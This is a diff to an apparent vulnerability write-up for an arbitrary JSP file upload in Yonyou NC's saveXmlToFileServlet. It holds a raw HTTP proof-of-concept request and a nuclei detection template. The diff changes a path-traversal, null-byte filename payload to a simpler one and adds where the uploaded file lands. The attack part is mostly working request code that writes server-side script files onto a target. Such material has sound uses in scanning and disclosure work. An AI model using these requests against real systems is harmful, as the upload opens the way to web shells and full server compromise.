@@ -11,14 +11,16 @@ title:"YONYOU NC"
 
 ## poc
 ```
-POST /portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename=..\\..\\..\\webapps\\nc_web\\test9527.jsp%00 HTTP/1.1
-Host: xxxxx
+POST /portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename=12121.jsp%00 HTTP/1.1
+Host: 
 Content-Type: application/octet-stream
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+Content-Length: 19
 
-123
-
+111
 ```
+
+文件路径：`http://ip:port/portal/processxml/12121.jsp`
 
 ## nuclei
 ```nuclei
@@ -31,7 +33,7 @@ info:
 http:
   - method: POST
     path:
-      - "{{BaseURL}}/portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename=..\\..\\..\\webapps\\nc_web\\{{randstr_1}}.jsp%00"
+      - "{{BaseURL}}/portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename={{randstr_1}}.jsp%00"
     headers:
       Cookie: LA_K1=langid
       serverEnable: localserver
@@ -45,7 +47,7 @@ http:
 
   - method: GET
     path:
-      - "{{BaseURL}}/{{randstr_1}}.jsp"
+      - "{{BaseURL}}/portal/processxml/{{randstr_1}}.jsp"
     matchers:
       - type: word
         words:
